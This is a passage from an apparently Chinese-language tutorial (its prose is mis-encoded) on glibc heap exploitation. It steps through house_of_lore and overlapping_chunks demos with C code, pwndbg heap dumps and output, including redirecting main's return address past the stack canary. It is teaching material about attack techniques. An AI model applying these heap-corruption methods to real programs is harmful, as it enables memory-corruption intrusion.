<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">victim-&gt;fwd: 0x7ffff7dd1bd8</span><br><span class="line">victim-&gt;bk: 0x7ffff7dd1bd8</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥å¼€å§‹æ¼æ´åˆ©ç”¨ï¼šå‡è®¾æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ victim chunk çš„ bk æŒ‡é’ˆï¼Œå¹¶è®©å®ƒæŒ‡å‘æˆ‘ä»¬æ ˆä¸Šçš„ fake chunkã€‚</p>
<p>ä¿®æ”¹å‰ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 113, </span><br><span class="line">  fd &#x3D; 0x7ffff7dd1bd8 &lt;main_arena+184&gt;, </span><br><span class="line">  bk &#x3D; 0x7ffff7dd1bd8 &lt;main_arena+184&gt;, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x70: 0x603000 â€”â–¸ 0x7ffff7dd1bd8 (main_arena+184) â—‚â€” 0x603000</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x&#x2F;20gx 0x603000</span><br><span class="line">0x603000:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x603010:	0x00007ffff7dd1bd8	0x00007ffff7dd1bd8</span><br><span class="line">0x603020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603070:	0x0000000000000070	0x00000000000003f0</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹åï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 113, </span><br><span class="line">  fd &#x3D; 0x7ffff7dd1bd8 &lt;main_arena+184&gt;, </span><br><span class="line">  bk &#x3D; 0x7fffffffdc70, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x70 [corrupted]</span><br><span class="line">FD: 0x603000 â€”â–¸ 0x7ffff7dd1bd8 (main_arena+184) â—‚â€” 0x603000</span><br><span class="line">BK: 0x603000 â€”â–¸ 0x7fffffffdc70 â€”â–¸ 0x7fffffffdc50 â€”â–¸ 0x400c4d (__libc_csu_init+77) â—‚â€” nop    </span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x&#x2F;20gx 0x603000</span><br><span class="line">0x603000:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x603010:	0x00007ffff7dd1bd8	0x00007fffffffdc70</span><br><span class="line">0x603020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603070:	0x0000000000000070	0x00000000000003f0</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ—¶å€™ï¼Œvictim chunk çš„ bk æŒ‡å‘äº† stack_buffer_1ï¼Œè€Œæˆ‘ä»¬ä¹‹å‰è®¾ç½®äº† stack_buffer_1 çš„ fd æŒ‡å‘äº† victim_chunkã€‚ç”±äº small bins æ˜¯å…ˆè¿›åå‡ºçš„ï¼ŒèŠ‚ç‚¹çš„å¢åŠ å‘ç”Ÿåœ¨é“¾è¡¨å¤´éƒ¨ï¼Œè€Œåˆ é™¤å‘ç”Ÿåœ¨å°¾éƒ¨ã€‚è¿™æ—¶çš„ small bin é“¾è¡¨æ•´ç†å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fake chunk 2 &lt;-- fake chunk 1 &lt;-- victim chunk &lt;-- head</span><br></pre></td></tr></table></figure>

<p>fake chunk 2 çš„ bk æŒ‡å‘äº†ä¸€ä¸ªæœªå®šä¹‰çš„åœ°å€ã€‚</p>
<blockquote>
<p>å¦‚æœèƒ½é€šè¿‡å†…å­˜æ³„éœ²ç­‰æ‰‹æ®µï¼Œæ‹¿åˆ° HEAD çš„åœ°å€å¹¶å¡«è¿›å»ï¼Œæ•´æ¡é“¾å°±é—­åˆäº†ã€‚å½“ç„¶è¿™é‡Œå®Œå…¨æ²¡æœ‰å¿…è¦è¿™ä¹ˆåšã€‚</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æˆ‘ä»¬ malloc ä¸€å— chunkï¼Œå¦‚æœæˆ‘ä»¬ malloc çš„å¤§å°æ°å¥½æ˜¯ victim chunk çš„å¤§å°ï¼ˆä¹Ÿå°±æ˜¯ç¬¬ä¸€å—è¢« free æ‰çš„å†…å­˜ï¼‰ï¼Œè¿™æ—¶ glibc ä¼šå°† victim chunk å–å‡ºï¼Œè®¾ç½®å®ƒçš„ bk ä¸º victim çš„ bkã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p p3</span><br><span class="line">$12 &#x3D; (void *) 0x603010</span><br><span class="line">pwndbg&gt; x&#x2F;20xg p3-0x10 </span><br><span class="line">0x603000:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x603010:	0x00007ffff7dd1bd8	0x00007fffffffdc70</span><br><span class="line">0x603020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603070:	0x0000000000000070	0x00000000000003f1</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line"><span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">       stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br></pre></td></tr></table></figure>

<p>æœ€åä¸€æ¬¡ malloc æ—¶ä¼šæ¬ºéª— glibc è¿”å› bin-&gt;bk æŒ‡å‘çš„ chunkã€‚åœ¨è¿™æ¬¡ malloc åï¼Œstack_buffer_2 çš„ fwd æŒ‡é’ˆä¼šå‘ç”Ÿæ”¹å˜ï¼Œè€Œä¸” p4 ä¼šåœ¨æ ˆä¸Šã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p stack_buffer_2</span><br><span class="line">$14 &#x3D; &#123;0x0, 0x0, 0x7ffff7dd1bd8 &lt;main_arena+184&gt;&#125;</span><br><span class="line">pwndbg&gt; p p4</span><br><span class="line">$15 &#x3D; 0x7fffffffdc80 &quot;\330\033\335\367\377\177&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line"><span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨å†…å­˜ä¸­çš„ shellcode å®Œæˆæ”»å‡»äº†ã€‚</p>
<p>p4 + 40 æ˜¯ main å‡½æ•°çš„è¿”å›åœ°å€ï¼Œè¢«ä¿®æ”¹ä¸º jackpot çš„åœ°å€ï¼Œæ‰§è¡Œæµè¢«é‡å®šå‘å®Œæˆäº†æ”»å‡»ã€‚</p>
<blockquote>
<p>æœ€åï¼Œæˆ‘ä»¬è¯´çš„æ˜¯small bin é“¾çš„æ„é€ ï¼Œå…¶å®æˆ‘è¿™é‡Œç”¨çš„æ˜¯ fastbin ï¼Œå…¶é‡Šæ”¾åè™½ç„¶æ˜¯è¢«åŠ å…¥åˆ° fast bins ä¸­ï¼Œè€Œsmall binæ˜¯é‡Šæ”¾å æ”¾å…¥ unsorted binï¼Œä½† malloc ä¹‹åï¼Œä¹Ÿä¼šè¢«æ•´ç†åˆ° small bins é‡Œã€‚</p>
</blockquote>
<h2 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h2><p>Exploit the overwrite of a freed chunk size in the unsorted bin in order to make a new allocation overlap with an existing chunk</p>
<blockquote>
<p>ç®€å•çš„å †é‡å ï¼Œé€šè¿‡ä¿®æ”¹ sizeï¼Œåå¹¶é‚»å—ï¼Œç„¶åå†ä¸‹æ¬¡ mallocçš„æ—¶å€™ï¼ŒæŠŠé‚»å—ç»™ä¸€èµ·åˆ†é…å‡ºæ¥ã€‚è¿™ä¸ªæ—¶å€™å°±æœ‰äº†ä¸¤ä¸ªæŒ‡é’ˆå¯ä»¥æ“ä½œé‚»å—ã€‚ä¸€ä¸ªæ–°å—æŒ‡é’ˆï¼Œä¸€ä¸ªæ—§å—æŒ‡é’ˆã€‚</p>
</blockquote>
<h3 id="è¾“å‡º-1"><a href="#è¾“å‡º-1" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;glibc_2.25&#x2F;overlapping_chunks</span><br><span class="line"></span><br><span class="line">This is a simple chunks overlapping problem</span><br><span class="line"></span><br><span class="line">Let&#39;s start to allocate 3 chunks on the heap</span><br><span class="line">The 3 chunks have been allocated here:</span><br><span class="line">p1&#x3D;0x603010</span><br><span class="line">p2&#x3D;0x603110</span><br><span class="line">p3&#x3D;0x603210</span><br><span class="line"></span><br><span class="line">Now let&#39;s free the chunk p2</span><br><span class="line">The chunk p2 is now in the unsorted bin ready to serve possible</span><br><span class="line">new malloc() of its size</span><br><span class="line">Now let&#39;s simulate an overflow that can overwrite the size of the</span><br><span class="line">chunk freed p2.</span><br><span class="line">For a toy program, the value of the last 3 bits is unimportant; however, it is best to maintain the stability of the heap.</span><br><span class="line">To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse), to assure that p1 is not mistaken for a free chunk.</span><br><span class="line">We are going to set the size of chunk p2 to to 385, which gives us</span><br><span class="line">a region size of 376</span><br><span class="line"></span><br><span class="line">Now let&#39;s allocate another chunk with a size equal to the data</span><br><span class="line">size of the chunk p2 injected size</span><br><span class="line">This malloc will be served from the previously freed chunk that</span><br><span class="line">is parked in the unsorted bin which size has been modified by us</span><br><span class="line"></span><br><span class="line">p4 has been allocated at 0x603110 and ends at 0x603288</span><br><span class="line">p3 starts at 0x603210 and ends at 0x603288</span><br><span class="line">p4 should overlap with p3, in this case p4 includes all p3.</span><br><span class="line"></span><br><span class="line">Now everything copied inside chunk p4 can overwrites data on</span><br><span class="line">chunk p3, and data written to chunk p3 can overwrite data</span><br><span class="line">stored in the p4 chunk.</span><br><span class="line"></span><br><span class="line">Let&#39;s run through an example. Right now, we have:</span><br><span class="line">p4 &#x3D; xï¿½ï¿½ï¿½</span><br><span class="line">3 &#x3D; 333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333ï¿½</span><br><span class="line"></span><br><span class="line">If we memset(p4, &#39;4&#39;, 376), we have:</span><br><span class="line">p4 &#x3D; 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444ï¿½</span><br><span class="line">3 &#x3D; 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444ï¿½</span><br><span class="line"></span><br><span class="line">And if we then memset(p3, &#39;3&#39;, 80), we have:</span><br><span class="line">p4 &#x3D; 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444ï¿½</span><br><span class="line">3 &#x3D; 333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444ï¿½</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="è§£é‡Š-1"><a href="#è§£é‡Š-1" class="headerlink" title="è§£é‡Š"></a>è§£é‡Š</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThis is a simple chunks overlapping problem\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s start to allocate 3 chunks on the heap\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(p1, <span class="string">&#x27;1&#x27;</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memset</span>(p2, <span class="string">&#x27;2&#x27;</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆç”³è¯·ä¸‰ä¸ª chunkï¼Œåˆ†åˆ«å¡«å…… 1ã€2ã€3ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 257, </span><br><span class="line">  fd &#x3D; 0x3131313131313131, </span><br><span class="line">  bk &#x3D; 0x3131313131313131, </span><br><span class="line">  fd_nextsize &#x3D; 0x3131313131313131, </span><br><span class="line">  bk_nextsize &#x3D; 0x3131313131313131</span><br><span class="line">&#125;</span><br><span class="line">0x603100 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 3544668469065756977, </span><br><span class="line">  size &#x3D; 257, </span><br><span class="line">  fd &#x3D; 0x3232323232323232, </span><br><span class="line">  bk &#x3D; 0x3232323232323232, </span><br><span class="line">  fd_nextsize &#x3D; 0x3232323232323232, </span><br><span class="line">  bk_nextsize &#x3D; 0x3232323232323232</span><br><span class="line">&#125;</span><br><span class="line">0x603200 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 3617008641903833650, </span><br><span class="line">  size &#x3D; 129, </span><br><span class="line">  fd &#x3D; 0x3333333333333333, </span><br><span class="line">  bk &#x3D; 0x3333333333333333, </span><br><span class="line">  fd_nextsize &#x3D; 0x3333333333333333, </span><br><span class="line">  bk_nextsize &#x3D; 0x3333333333333333</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥ free chunk 2</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>chunk 2 è¢«åˆ†é…åˆ°äº† unsorted bin ä¸­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x603100 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 3544668469065756977, </span><br><span class="line">  size &#x3D; 257, </span><br><span class="line">  fd &#x3D; 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  bk &#x3D; 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  fd_nextsize &#x3D; 0x3232323232323232, </span><br><span class="line">  bk_nextsize &#x3D; 0x3232323232323232</span><br><span class="line">&#125;</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x603100 â€”â–¸ 0x7ffff7dd1b78 (main_arena+88) â—‚â€” 0x603100</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now let&#x27;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;For a toy program, the value of the last 3 bits is unimportant;&quot;</span></span><br><span class="line">	<span class="string">&quot; however, it is best to maintain the stability of the heap.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),&quot;</span></span><br><span class="line">	<span class="string">&quot; to assure that p1 is not mistaken for a free chunk.\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æˆ‘ä»¬å‡è®¾æœ‰ä¸€ä¸ªæº¢å‡ºå¯ä»¥è¦†ç›– p2 çš„ sizeã€‚å°½ç®¡å¯¹äºæˆ‘ä»¬çš„ç¨‹åºæ¥è®²æœ€åä¸‰ä½å¹¶ä¸é‡è¦ï¼Œä½†æ˜¯ä¸ºäº†å †çš„ç¨³å®šæ€§ï¼Œæœ€å¥½è¿˜æ˜¯ä¸è¦éšæ„æ”¹åŠ¨ã€‚ä¸ºäº†ä¿æŒç¨³å®šæ€§ï¼Œæˆ‘ä»¬è‡³å°‘è¦å°†æœ€ä½ä½ï¼ˆLSB, prev_inuseï¼‰ä½ä¿æŒä¸º 1ï¼Œè¿™æ · p1 å°±ä¸ä¼šè¢«è¯¯è®¤ä¸ºæ˜¯ä¸€ä¸ªæœªåˆ†é…çš„å—äº†ã€‚</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> evil_chunk_size = <span class="number">0x181</span>;</span><br><span class="line"><span class="keyword">int</span> evil_region_size = <span class="number">0x180</span> - <span class="number">8</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,</span><br><span class="line">	 evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å°† p2 çš„ size æ”¹å†™ä¸º 0x181ï¼Œä¹‹å malloc ä¼šè¿”å›ç»™æˆ‘ä»¬ä¸€ä¸ª 0x178 å¤§å°çš„å—ã€‚</p>
<p>ä¿®æ”¹å‰ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10xg p2-2</span><br><span class="line">0x603100:	0x3131313131313131	0x0000000000000101</span><br><span class="line">0x603110:	0x00007ffff7dd1b78	0x00007ffff7dd1b78</span><br><span class="line">0x603120:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x603130:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x603140:	0x3232323232323232	0x3232323232323232</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹åï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10xg p2-2</span><br><span class="line">0x603100:	0x3131313131313131	0x0000000000000181</span><br><span class="line">0x603110:	0x00007ffff7dd1b78	0x00007ffff7dd1b78</span><br><span class="line">0x603120:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x603130:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x603140:	0x3232323232323232	0x3232323232323232</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 257, </span><br><span class="line">  fd &#x3D; 0x3131313131313131, </span><br><span class="line">  bk &#x3D; 0x3131313131313131, </span><br><span class="line">  fd_nextsize &#x3D; 0x3131313131313131, </span><br><span class="line">  bk_nextsize &#x3D; 0x3131313131313131</span><br><span class="line">&#125;</span><br><span class="line">0x603100 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 3544668469065756977, </span><br><span class="line">  size &#x3D; 385, </span><br><span class="line">  fd &#x3D; 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  bk &#x3D; 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  fd_nextsize &#x3D; 0x3232323232323232, </span><br><span class="line">  bk_nextsize &#x3D; 0x3232323232323232</span><br><span class="line">&#125;</span><br><span class="line">0x603280 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 3689348814741910323, </span><br><span class="line">  size &#x3D; 134529, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶ chunk2 ä¼šåå¹¶ chunk3ã€‚</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span></span><br><span class="line">       <span class="string">&quot;size of the chunk p2 injected size\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This malloc will be served from the previously freed chunk that\n&quot;</span></span><br><span class="line">       <span class="string">&quot;is parked in the unsorted bin which size has been modified by us\n&quot;</span>);</span><br><span class="line">p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span></span><br><span class="line">       <span class="string">&quot;size of the chunk p2 injected size\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This malloc will be served from the previously freed chunk that\n&quot;</span></span><br><span class="line">       <span class="string">&quot;is parked in the unsorted bin which size has been modified by us\n&quot;</span>);</span><br><span class="line">p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x80</span><span class="number">-8</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line">	<span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥å†ç”³è¯·ä¸€å— 0x178 å¤§å°çš„å†…å­˜ï¼Œmalloc ä¼šæŠŠ chunk2 å’Œchunk3 ä¸€èµ·åˆ†é…å‡ºæ¥ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p p4</span><br><span class="line">$2 &#x3D; (intptr_t *) 0x603110</span><br><span class="line">pwndbg&gt; p p2</span><br><span class="line">$3 &#x3D; (intptr_t *) 0x603110</span><br><span class="line">pwndbg&gt; p p3</span><br><span class="line">$4 &#x3D; (intptr_t *) 0x603210</span><br><span class="line">p4 has been allocated at 0x603110 and ends at 0x603288</span><br><span class="line">p3 starts at 0x603210 and ends at 0x603288</span><br><span class="line">p4 should overlap with p3, in this case p4 includes all p3.</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s run through an example. Right now, we have:\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);</span><br><span class="line"><span class="built_in">memset</span>(p4, <span class="string">&#x27;4&#x27;</span>, evil_region_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span 